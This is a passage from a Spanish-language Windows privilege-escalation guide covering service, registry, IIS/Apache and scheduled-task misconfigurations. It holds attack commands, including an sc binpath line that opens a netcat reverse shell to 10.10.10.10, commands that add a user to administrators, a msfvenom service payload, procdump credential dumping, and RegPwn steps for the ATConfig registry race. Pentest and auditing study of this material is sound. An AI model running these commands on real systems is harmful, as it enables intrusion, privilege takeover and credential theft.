qwinsta
klist sessions
```

### Carpetas personales

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Política de contraseñas

```bash
net accounts
```

### Obtener el contenido del portapapeles

```bash
powershell -command "Get-Clipboard"
```

## Procesos en ejecución

### Permisos de archivos y carpetas

En primer lugar, al enumerar los procesos, **comprueba si hay contraseñas en la línea de comandos del proceso**.\
Comprueba si puedes **sobrescribir algún binario en ejecución** o si tienes permisos de escritura en la carpeta del binario para explotar posibles [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Comprueba siempre si hay [**electron/cef/chromium debuggers** en ejecución; podrías aprovecharlos para escalar privilegios](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Un debugger listener puede durar poco, por lo que no encontrarlo en una única captura pasiva de puertos no demuestra que nunca haya estado expuesto. Relaciona cualquier listener observado con su PID, el propietario del proceso y la capacidad del usuario con menos privilegios para acceder a él; el nombre de una aplicación o un debug flag, por sí solos, no demuestran que sea posible ejecutar código entre usuarios. Mantén la enumeración rutinaria en modo pasivo, en lugar de enviar comandos al debugger.

**Comprobación de los permisos de los binarios de los procesos**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Comprobación de los permisos de las carpetas de los binarios de los procesos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Directorios de preprocesadores dinámicos de Snort

Snort 2 puede cargar bibliotecas compartidas desde un `dynamicpreprocessor directory` declarado en la configuración seleccionada con `snort.exe -c <config>`. Para una tarea programada o un servicio que ejecute Snort con otra cuenta, inspecciona esa configuración exacta y la ACL del directorio de módulos declarado. Si tu token puede crear archivos allí, la ruta es una candidata a revisión por posible ejecución de código la próxima vez que esa tarea o servicio cargue módulos. Verifica los privilegios efectivos de la cuenta de ejecución, la configuración activa, la compatibilidad de los módulos y cualquier restricción de denegación o de recursos compartidos; que un directorio permita escritura no demuestra por sí solo una escalada. La [documentación de preprocesadores dinámicos de Snort](https://www.snort.org/documents/dpx-readme) describe la carga de módulos en tiempo de ejecución.

### Servicio web privilegiado con una raíz de documentos que permite escritura

En una instalación de Apache para Windows, compara la ruta del ejecutable del servicio y la cuenta de ejecución con `DocumentRoot` en el `httpd.conf` activo. En una instalación convencional de XAMPP, inspecciona `C:\xampp\apache\conf\httpd.conf` y la ACL de la raíz de documentos configurada, a menudo `C:\xampp\htdocs`. Si un usuario con menos privilegios puede crear archivos en esa raíz mientras Apache se ejecuta como `LocalSystem`, la ejecución de código del lado del servidor podría cruzar el límite de privilegios del host. Confirma que el servicio está en ejecución, que se sirve la ruta exacta y que un controlador del lado del servidor procesa ese tipo de archivo; que una raíz permita escritura solo demuestra que se pueden crear archivos. Inspecciona las ACL sin escribir un archivo de prueba:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Para una instalación WAMP convencional, el servicio puede apuntar a una ruta versionada `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (o `C:\wamp\...` en una instalación de 32 bits), con la configuración al lado, en `conf\httpd.conf`, y una raíz predeterminada `C:\wamp64\www` o `C:\wamp\www`. Comprueba conjuntamente la imagen exacta del servicio, la identidad con la que se ejecuta, el `DocumentRoot` efectivo (incluida la expansión de `${INSTALL_DIR}` y las sobrescrituras de hosts virtuales) y la ACL de la raíz. Que un directorio WAMP permita escritura no demuestra que Apache se ejecute como `SYSTEM` ni que ejecute el archivo enviado. [Apache documenta cómo un servicio de Windows selecciona su configuración](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Raíz de IIS con permisos de escritura e identidad de red del grupo de aplicaciones

En IIS, asigna un directorio físico con permisos de escritura a un **sitio/aplicación activo** en `applicationHost.config` y, luego, identifica su grupo configurado y el controlador del lado del servidor. El código ubicado en un directorio servido se ejecuta como el grupo solo si IIS procesa ese tipo de archivo y se puede acceder a la ruta. Comprueba los permisos efectivos del usuario actual para crear archivos, el estado de ejecución del sitio, el controlador y las sobrescrituras por ruta antes de considerar que un directorio con permisos de escritura permite ejecutar código.

La compilación dinámica de ASP.NET introduce otra ruta que conviene revisar: los archivos generados en el directorio de compilación de la aplicación. De forma predeterminada, se encuentra en un directorio `Temporary ASP.NET Files` bajo la instalación de .NET Framework correspondiente, pero `<compilation tempDirectory>` de la aplicación puede cambiarlo. [Microsoft documenta la ubicación y los subdirectorios por aplicación](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) y [recomienda aislar los directorios de compilación cuando los grupos de aplicaciones no confían entre sí](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Si un token con menos privilegios puede modificar el código fuente generado en la caché de la **aplicación específica**, determina si esa aplicación lo recompila bajo una [identidad de proceso de trabajo](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) con más privilegios. Una ACL de archivo o directorio por sí sola no demuestra la ejecución de código: correlaciona la caché con la aplicación activa, el token y la ACL efectivos, la configuración de compilación, la identidad del proceso y el momento de cualquier recompilación. Revisa solo metadatos; no actives la compilación ni modifiques archivos de la caché durante la enumeración.

Un grupo de IIS configurado como `ApplicationPoolIdentity` o `NetworkService` suele autenticarse en recursos del dominio como la **cuenta del equipo host**, aunque su token local tenga pocos privilegios. `LocalSystem` ya tiene muchos privilegios localmente y también usa la cuenta del equipo en la red; `LocalService` normalmente presenta credenciales de red anónimas. Un grupo `SpecificUser` utiliza la cuenta que tiene configurada. [Microsoft documenta estos tipos de identidad](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) y [la identidad de red del grupo de aplicaciones](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Si se omite la configuración de identidad, se pueden heredar los valores predeterminados del grupo, que varían según la versión de IIS; por tanto, resuelve la configuración efectiva en vez de hacer suposiciones basadas en el nombre del grupo. Si la ejecución de código llega a un grupo con identidad de red de cuenta de equipo, evalúa los permisos de directorio de **ese equipo específico**. [DCSync](../active-directory-methodology/dcsync.md) requiere permisos de replicación en el contexto de nomenclatura del dominio; un ticket de cuenta de equipo o la función del host por sí solos no los demuestran. La enumeración pasiva debe inspeccionar la configuración y las ACL sin cargar archivos, realizar una autenticación de red ni solicitar tickets.

En un controlador ASP.NET legible que inicia un proceso auxiliar, sigue cualquier valor derivado de una solicitud a través de la autenticación, el descifrado, la validación y la construcción del comando. Un controlador que concatena un token decodificado en `ProcessStartInfo("cmd", "/c ...")` puede permitir que los metacaracteres del shell modifiquen el comando; [Microsoft documenta los caracteres especiales de `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Confirma que una persona no confiable pueda influir realmente en el valor decodificado y acceder al controlador; luego, determina la identidad efectiva del grupo de aplicaciones o la identidad suplantada, así como la identidad del proceso secundario. Una línea de código fuente legible, un listener de localhost o una debilidad en el formato del token por sí solos no demuestran la ejecución de comandos con privilegios. Revisa el código fuente y la configuración del grupo sin enviar solicitudes falsificadas ni ejecutar el proceso auxiliar durante la enumeración pasiva.

En un servicio PHP en Windows, una ruta controlada por la solicitud que se pasa a [`include` o `require`](https://www.php.net/manual/en/function.include.php) puede evaluar un archivo PHP que un usuario con menos privilegios puede modificar, bajo la identidad del proceso de trabajo. Confirma que la solicitud pueda llegar a esa instrucción, que la ruta resuelta corresponda a un archivo que el usuario con menos privilegios pueda modificar y que el proceso de trabajo pueda leer, que las restricciones de ruta PHP aplicables permitan la inclusión y que el proceso de trabajo se ejecute realmente con más privilegios. Un listener de loopback o un archivo con permisos de escritura por sí solos no demuestran esta cadena; inspecciona el código fuente, la identidad del servicio y las ACL de archivos sin invocar el endpoint durante la enumeración pasiva.

### Extracción de contraseñas de la memoria

Puedes crear un volcado de memoria de un proceso en ejecución usando **procdump**, de sysinternals. Servicios como FTP tienen las **credenciales en texto claro en memoria**; intenta volcar la memoria y leer las credenciales.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Aplicaciones GUI inseguras

**Las aplicaciones que se ejecutan como SYSTEM pueden permitir que un usuario abra un CMD o explore directorios.**

Ejemplo: «Ayuda y soporte técnico de Windows» (Windows + F1), busca «símbolo del sistema» y haz clic en «Haz clic para abrir el símbolo del sistema»

### Importación de archivos de proyecto con privilegios

Una aplicación que abre automáticamente proyectos desde un directorio de entrega en el que puede escribir un usuario de menor privilegio cruza un límite de confianza de entrada bajo la cuenta del importador. Revisa la **ruta exacta con permisos de escritura**, el proceso o la tarea que la abre, su identidad efectiva y la versión del parser. Un [problema histórico al abrir o restaurar proyectos de Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) permitía el uso de entidades externas XML en los metadatos del proyecto; una entidad de red en Windows podía provocar autenticación con la cuenta del importador si la [política de salida SMB y NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) lo permitía. Esto es una pista de exposición de credenciales, no acceso inmediato de administrador: la respuesta debe poder utilizarse a través de otra ruta autorizada o vulnerable, y las versiones actuales deben evaluarse según su estado real de parcheado. No abras un proyecto manipulado durante el reconocimiento pasivo; inspecciona el flujo de importación y las ACL.

## Servicios

El derecho [`SC_MANAGER_CREATE_SERVICE` del objeto Service Control Manager (SCM)](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) es independiente de los derechos sobre un servicio existente. Una solicitud de acceso de solo lectura [`OpenSCManager` satisfactoria](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) para ese derecho es una pista para revisar, no una prueba de que se pueda ejecutar un servicio nuevo. [`CreateService` devuelve un identificador](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) con los permisos de servicio solicitados al crearlo; abrir el servicio de nuevo más adelante implica una comprobación de acceso independiente y puede fallar aunque se pueda usar el identificador original. Verifica por separado el token local o remoto efectivo, los permisos concedidos al identificador, la cuenta del servicio, la política de inicio y la ruta del ejecutable. No crees ni inicies un servicio durante el reconocimiento pasivo.

Para una ruta de instalación de servicios remota, relaciona esos permisos del SCM con un recurso compartido del destino en el que pueda escribir el **mismo inicio de sesión de red**, su ACL NTFS subyacente y una ruta de ejecutable local que la cuenta del servicio pueda ejecutar. Una cuenta no administrativa puede cruzar este límite si existen permisos del SCM inusualmente amplios y también una ruta para colocar el archivo; un recurso compartido administrativo no es un requisito inherente. Tener permiso de escritura en el recurso compartido por sí solo, o una pista de creación de servicios en el SCM por sí sola, no demuestra que el nuevo servicio pueda iniciarse con una identidad de mayor privilegio.

Un servicio existente puede invocar un ejecutable auxiliar al iniciarse, detenerse o durante otro evento del ciclo de vida, aunque ese auxiliar no aparezca en su `ImagePath`. Si el nombre del auxiliar se resuelve en un directorio en el que puede escribir un usuario de menor privilegio y el servicio se ejecuta con una identidad de mayor privilegio, la ausencia del archivo auxiliar puede ser una oportunidad de reemplazo condicional. Confirma el **código real del servicio o la invocación documentada del auxiliar**, la ruta del ejecutable resuelta y el orden de búsqueda, los permisos para crear archivos en el directorio, la identidad del servicio y la existencia de un activador del ciclo de vida disponible. Que se pueda escribir en el directorio de un servicio o que falte un archivo, por sí solo, no demuestra que el servicio lo cargue; durante una revisión pasiva, no inicies ni detengas el servicio.

Para un servicio existente, [`SERVICE_START` permite proporcionar argumentos a `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); es distinto de [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Revisa el código o la interfaz documentada del servicio antes de considerar que el permiso de inicio sea algo más que un permiso de control. Si utiliza un argumento elegido por quien lo invoca como ruta de registro o exportación, verifica la identidad del servicio, el flujo exacto del argumento hasta la escritura, las restricciones de ruta y los permisos del **archivo creado**. Una escritura en un directorio protegido solo puede convertirse en escalada si existe otro consumidor o cargador privilegiado que acepte ese archivo; un registro en una ruta en la que se puede escribir o el permiso de inicio, por sí solos, no bastan. El inventario pasivo no debe iniciar el servicio ni crear un archivo de prueba.

Para un agente de monitorización NSClient++, un archivo `nsclient.ini` legible es una **pista para revisar la configuración**: puede contener credenciales web, mientras que `boot.ini` puede redirigir la configuración a otra ubicación. Comprueba la cuenta real del servicio, el listener WEB y la política de acceso, y si el rol autenticado puede cambiar la configuración o los scripts. La ejecución con privilegios requiere además `CheckExternalScripts` (u otra ruta de ejecución habilitada), un permiso efectivo para registrar o modificar un comando y un activador que lo ejecute con la identidad del servicio. Un listener limitado a loopback puede seguir siendo accesible para un usuario local, pero la ruta del archivo, la contraseña o el listener, por sí solos, no demuestran que existan esos permisos. Revisa los metadatos y los permisos sin mostrar secretos ni invocar la API web durante el reconocimiento pasivo. Consulta la [estructura de archivos de NSClient++](https://nsclient.org/docs/concepts/file-layout/), las [recomendaciones de seguridad web y de scripts](https://nsclient.org/docs/setup/securing/) y la [configuración de scripts externos](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Para un servicio cuyo `ImagePath` sea `nssm.exe`, inspecciona la cuenta real con la que se ejecuta el servicio y su valor `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM almacena allí la aplicación hija](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), mientras que `AppDirectory` es el directorio de trabajo configurado. Comprueba el ejecutable hijo y las ACL de su directorio principal antes de considerar que los permisos del wrapper describen todo el límite del servicio. Un endpoint local WCF o SOAP expuesto por ese proceso hijo es una pista independiente para revisar: confirma que el usuario de menor privilegio pueda acceder al listener, que la operación exacta acepte su entrada y que el proceso hijo del servicio ejecute la operación insegura con una identidad de mayor privilegio. La cuenta del servicio, una URL de endpoint o una ruta con permisos de escritura, por sí solas, no demuestran que sea posible escalar privilegios; evita invocar operaciones del servicio durante el reconocimiento pasivo.

Para una operación WCF personalizada, sigue una cadena desde una cadena controlada por quien la invoca hasta cualquier runspace de PowerShell. [`Pipeline.Commands.AddScript` agrega texto de script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), y [`Pipeline.Invoke` ejecuta la pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Un [`netTcpBinding` con credenciales de transporte de Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentica al cliente, pero hay que comprobar por separado la autorización para invocar esa **operación específica** y la identidad efectiva del runspace. Una ruta desde la entrada de un usuario de menor privilegio hasta `AddScript`, ejecutada con la identidad de un servicio de mayor privilegio, constituye un límite de ejecución de código; un puerto en escucha, un cliente autenticado o un método no utilizado de un ensamblado no relacionado no son prueba por sí solos. Revisa estáticamente el servicio implementado, el contrato, la autorización y la configuración de suplantación sin invocar el endpoint durante el reconocimiento.

Los Service Triggers permiten que Windows inicie un servicio cuando se producen ciertas condiciones (actividad de named pipe/endpoint RPC, eventos ETW, disponibilidad de IP, llegada de dispositivos, actualización de GPO, etc.). Incluso sin permisos SERVICE_START, a menudo puedes iniciar servicios privilegiados activando sus triggers. Consulta aquí las técnicas de enumeración y activación:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Servicio de recopilación de diagnósticos de Visual Studio

Las instalaciones de Visual Studio con herramientas de C/C++ pueden incluir `VSStandardCollectorService150`, un servicio de diagnóstico configurado para ejecutarse como `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) utilizó una junction y una race condition con un object-manager link para redirigir un restablecimiento de DACL del servicio. La escalada demostrada también requería una ruta de reparación MSI utilizable del Visual Studio Setup WMI Provider y su destino `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. El componente se corrigió en enero de 2024.

Para el triaje pasivo, inspecciona la cuenta y la ruta del binario de ese servicio, comprueba si existe la ruta del compilador Setup WMI y verifica el estado de parcheado del componente instalado. Una entrada del servicio, la versión del producto Visual Studio o la presencia del archivo del compilador, por sí solas, no demuestran que el host sea vulnerable. La inspección no requiere iniciar el servicio ni ejecutar una reparación.

Obtén una lista de servicios:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permisos

Puedes usar **sc** para obtener información sobre un servicio.

```bash
sc qc <service_name>
```

Se recomienda tener el binario **accesschk** de _Sysinternals_ para comprobar el nivel de privilegio requerido para cada servicio.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Se recomienda comprobar si "Authenticated Users" puede modificar algún servicio:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Puede descargar accesschk.exe para XP aquí](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar el servicio

Si recibe este error (por ejemplo, con SSDPSRV):

_Error del sistema 1058._\
_No se puede iniciar el servicio porque está deshabilitado o porque no tiene dispositivos habilitados asociados._

Puede habilitarlo usando

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Ten en cuenta que el servicio upnphost depende de SSDPSRV para funcionar (en XP SP1)**

**Otra solución alternativa** a este problema es ejecutar:

```
sc.exe config usosvc start= auto
```

### **Modificar la ruta del binario del servicio**

En el escenario en que el grupo «Usuarios autenticados» posee **SERVICE_ALL_ACCESS** sobre un servicio, es posible modificar el binario ejecutable del servicio. Para modificar y ejecutar **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Reiniciar servicio

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Los privilegios se pueden escalar mediante varios permisos:

- **SERVICE_CHANGE_CONFIG**: Permite reconfigurar el binario del servicio.
- **WRITE_DAC**: Permite reconfigurar los permisos, lo que permite cambiar las configuraciones del servicio.
- **WRITE_OWNER**: Permite adquirir la propiedad y reconfigurar los permisos.
- **GENERIC_WRITE**: Hereda la capacidad de cambiar las configuraciones del servicio.
- **GENERIC_ALL**: También hereda la capacidad de cambiar las configuraciones del servicio.

Para detectar y explotar esta vulnerabilidad, se puede utilizar _exploit/windows/local/service_permissions_.

### Permisos débiles en los binarios de servicios

Si un servicio se ejecuta como **`LocalSystem`**, **`LocalService`**, **`NetworkService`** o una cuenta de dominio con privilegios, pero **los usuarios con pocos privilegios pueden modificar el EXE del servicio o su carpeta principal**, a menudo se puede secuestrar el servicio **reemplazando el binario y reiniciando el servicio**.

**Comprueba si puedes modificar el binario que ejecuta un servicio** o si tienes **permisos de escritura en la carpeta** donde se encuentra el binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puedes obtener todos los binarios que ejecuta un servicio mediante **wmic** (no en system32) y comprobar tus permisos con **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

También puedes usar **sc** e **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Busca ACL peligrosas concedidas a **`Everyone`**, **`BUILTIN\Users`** o **`Authenticated Users`**, especialmente **`(F)`**, **`(M)`** o **`(W)`** en el ejecutable del servicio o en el directorio que lo contiene. Un flujo práctico para aprovecharlo es:<sup>[[27]](#references)</sup>

1. Confirma la cuenta del servicio y la ruta del ejecutable con `sc qc <service_name>`.
2. Confirma que se puede escribir en el binario con `icacls <path>`.
3. Reemplaza el binario del servicio por un payload o un binario malicioso válido para el servicio.
4. Reinicia el servicio con `sc stop <service_name> && sc start <service_name>` (o espera a que se reinicie el equipo o se active un service trigger).

Comprobaciones automatizadas útiles:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Si el servicio no permite que un usuario normal lo reinicie, comprueba si se inicia automáticamente al arrancar, si tiene una acción de recuperación que lo vuelve a iniciar o si la aplicación que lo utiliza puede activarlo indirectamente.

### Permisos de modificación del registro de servicios

Debes comprobar si puedes modificar alguna clave del registro de servicios.\
Puedes **comprobar** tus **permisos** sobre una **clave del registro** del servicio haciendo lo siguiente:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Revisa si **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** tienen permisos de escritura en el registro para una clave de servicio concreta. Una entrada de ACL por sí sola no demuestra que el acceso sea efectivo: también importan las entradas de denegación, el token actual y los permisos heredados. Los derechos sobre la clave del registro son independientes de los derechos `SERVICE_CHANGE_CONFIG` y `SERVICE_START` del objeto de servicio. Para la escalada también se necesita un campo utilizable en la configuración del servicio, una forma de activarlo y una identidad de servicio con más privilegios. Consulta la documentación de Microsoft sobre los [derechos de acceso a claves del registro](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) y la [referencia de derechos de acceso a servicios](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Para cambiar la ruta del binario que se ejecuta:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Condición de carrera con un enlace simbólico del registro para escribir un valor arbitrario en HKLM (ATConfig)

Algunas características de accesibilidad de Windows crean claves **ATConfig** por usuario que posteriormente un proceso **SYSTEM** copia a una clave de sesión de HKLM. Una **condición de carrera con un enlace simbólico** del registro puede redirigir esa escritura privilegiada a **cualquier ruta de HKLM**, lo que permite escribir un **valor arbitrario en HKLM**.<sup>[[18]](#references)</sup>

Ubicaciones clave (por ejemplo: Teclado en pantalla `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` enumera las características de accesibilidad instaladas.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` almacena la configuración controlada por el usuario.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` se crea durante el inicio de sesión o las transiciones al escritorio seguro y el usuario puede escribir en ella.

Flujo de abuso (CVE-2026-24291 / ATConfig):

1. Establece el valor de **HKCU ATConfig** que quieres que SYSTEM escriba.
2. Activa la copia al escritorio seguro (por ejemplo, **LockWorkstation**), que inicia el flujo del agente de AT.
3. **Gana la carrera** colocando un **oplock** en `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; cuando se active el oplock, reemplaza la clave **HKLM Session ATConfig** por un **enlace del registro** a un destino protegido de HKLM.
4. SYSTEM escribe el valor elegido por el atacante en la ruta HKLM redirigida.

Una vez que puedes escribir valores arbitrarios en HKLM, escala privilegios locales (LPE) sobrescribiendo valores de configuración de servicios:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/línea de comandos)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Elige un servicio que un usuario normal pueda iniciar (por ejemplo, **`msiserver`**) y actívalo después de la escritura. **Nota:** la implementación pública del exploit **bloquea la estación de trabajo** como parte de la carrera.

Herramientas de ejemplo (RegPwn BOF / independiente):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Permisos AppendData/AddSubdirectory del registro de servicios

Si tienes este permiso sobre un registro, significa que **puedes crear subregistros a partir de este**. En el caso de los servicios de Windows, esto **basta para ejecutar código arbitrario**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Rutas de servicio sin comillas

Si la ruta a un ejecutable no está entre comillas, Windows intentará ejecutar cada ruta que termine antes de un espacio.

Por ejemplo, para la ruta _C:\Program Files\Some Folder\Service.exe_, Windows intentará ejecutar:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Enumera todas las rutas de servicio sin comillas, excluyendo las que pertenecen a servicios integrados de Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Puedes detectar y explotar** esta vulnerabilidad con metasploit: `exploit/windows/local/trusted\_service\_path` Puedes crear manualmente un binario de servicio con metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Acciones de recuperación

Windows permite a los usuarios especificar las acciones que se llevarán a cabo si un servicio falla. Esta función se puede configurar para que apunte a un binario. Si este binario se puede reemplazar, podría ser posible escalar privilegios. Puedes encontrar más detalles en la [documentación oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Destinos de scripts de tareas programadas

En una tarea habilitada que ejecuta `cmd.exe /c` con un archivo `.bat` o `.cmd`, comprueba tanto el script indicado en los **argumentos de la acción** como `cmd.exe`. Lo mismo se aplica al argumento de archivo explícito de un intérprete, como `-File` de PowerShell. Si un archivo por lotes programado contiene una llamada literal a PowerShell con `-File`, comprueba también la ACL del script al que hace referencia; las variables, las condicionales y el encadenamiento de comandos requieren un análisis manual. Un script o directorio principal en el que quien ejecuta la tarea pueda escribir solo constituye una vía para ejecutar código desde otra cuenta si la tarea está configurada para ejecutarse con una cuenta distinta y realmente llega a esa acción. Una ACL que solo permita añadir contenido puede ser relevante para los scripts, pero un `exit` anterior u otro flujo de control podría impedir que se ejecuten las líneas añadidas. Confirma las ACL efectivas, el [contexto de ejecución de la tarea](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), el directorio de trabajo, el desencadenador y la directiva de control de aplicaciones antes de afirmar que es posible escalar privilegios. El inventario no debe modificar el script ni iniciar la tarea.

## Flujos con nombre en archivos accesibles

